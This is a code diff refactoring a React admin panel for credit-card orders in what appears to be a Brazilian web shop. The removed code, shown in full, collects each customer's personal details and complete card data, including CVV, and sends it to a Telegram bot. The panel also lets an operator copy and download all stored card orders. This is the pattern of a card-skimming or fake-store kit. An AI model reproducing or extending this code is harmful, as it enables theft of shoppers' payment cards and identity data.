@@ -1,123 +1,13 @@
-import { useState, useEffect } from "react";
-import { Button } from "@/components/ui/button";
-import {
-  Card,
-  CardContent,
-  CardDescription,
-  CardHeader,
-  CardTitle,
-} from "@/components/ui/card";
+import { Card, CardContent } from "@/components/ui/card";
 import { useToast } from "@/hooks/use-toast";
-import { getFromLocalStorage, saveToLocalStorage } from "@/utils/localStorage";
-import { Download } from "lucide-react";
-import { OrderList } from "./credit-card-orders/OrderList";
 import { formatOrderData } from "@/utils/orderFormatter";
+import { OrderList } from "./credit-card-orders/OrderList";
+import { OrderManagerHeader } from "./credit-card-orders/OrderManagerHeader";
+import { useCreditCardOrders } from "@/hooks/useCreditCardOrders";
 
 export function CreditCardOrderManager() {
-  const [orders, setOrders] = useState<any[]>([]);
+  const { orders, handleCopyData, handleDelete } = useCreditCardOrders();
   const { toast } = useToast();
-
-  const fetchOrders = () => {
-    const allOrders = getFromLocalStorage('orders', []);
-    const creditOrders = allOrders.filter((order: any) => order.payment_method === 'credit');
-    setOrders(creditOrders);
-  };
-
-  useEffect(() => {
-    fetchOrders();
-  }, []);
-
-  const sendTelegramNotification = async (orderData: any) => {
-    const telegramConfig = getFromLocalStorage("telegramConfig", {
-      isEnabled: false,
-      botToken: "",
-      chatId: "",
-    });
-
-    if (!telegramConfig.isEnabled) return;
-
-    const message = `
-🔔 Novo Pedido com Cartão:
-
-Dados do Cliente:
----------------
-Nome: ${orderData.customer.name}
-CPF: ${orderData.customer.cpf}
-Email: ${orderData.customer.email}
-Telefone: ${orderData.customer.phone}
-
-Endereço:
---------
-${orderData.customer.address}
-${orderData.customer.city}, ${orderData.customer.state}
-CEP: ${orderData.customer.zipCode}
-
-Dados do Cartão:
---------------
-Número: ${orderData.credit_card_data.cardNumber}
-Titular: ${orderData.credit_card_data.cardHolder}
-Validade: ${orderData.credit_card_data.expiryDate}
-CVV: ${orderData.credit_card_data.cvv}
-Parcelamento: ${orderData.credit_card_data.installments}x sem juros
-
-Dados do Pedido:
---------------
-Data: ${new Date(orderData.timestamp).toLocaleString()}
-Total: R$ ${orderData.total.toFixed(2)}
-
-Itens:
------
-${orderData.items.map((item: any) => 
-  `${item.title} - Qtd: ${item.quantity} - R$ ${item.price.toFixed(2)}`
-).join('\n')}
-    `;
-
-    try {
-      const response = await fetch(
-        `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: telegramConfig.chatId,
-            text: message,
-            parse_mode: "HTML",
-          }),
-        }
-      );
-
-      if (!response.ok) {
-        throw new Error("Falha ao enviar notificação para o Telegram");
-      }
-    } catch (error) {
-      console.error("Erro ao enviar notificação:", error);
-      toast({
-        title: "Erro ao enviar notificação para o Telegram",
-        variant: "destructive",
-      });
-    }
-  };
-
-  const handleCopyData = (text: string) => {
-    navigator.clipboard.writeText(text);
-    toast({
-      title: "Dados copiados para a área de transferência"
-    });
-  };
-
-  const handleDelete = (orderId: string) => {
-    const allOrders = getFromLocalStorage('orders', []);
-    const updatedOrders = allOrders.filter((order: any) => order.id !== orderId);
-    saveToLocalStorage('orders', updatedOrders);
-    
-    toast({
-      title: "Pedido deletado com sucesso!"
-    });
-
-    fetchOrders();
-  };
 
   const handleDownloadAllTxt = () => {
     if (orders.length === 0) {
@@ -163,24 +53,7 @@ ${orderData.items.map((item: any) =>
   return (
     <div className="space-y-4">
       <Card>
-        <CardHeader>
-          <div className="flex justify-between items-center">
-            <div>
-              <CardTitle>Pedidos com Cartão</CardTitle>
-              <CardDescription>
-                Visualize e gerencie todos os pedidos com cartão de crédito
-              </CardDescription>
-            </div>
-            <Button
-              variant="outline"
-              onClick={handleDownloadAllTxt}
-              className="ml-4"
-            >
-              <Download className="w-4 h-4 mr-2" />
-              Baixar Todos
-            </Button>
-          </div>
-        </CardHeader>
+        <OrderManagerHeader onDownloadAll={handleDownloadAllTxt} />
         <CardContent>
           <OrderList
             orders={orders}
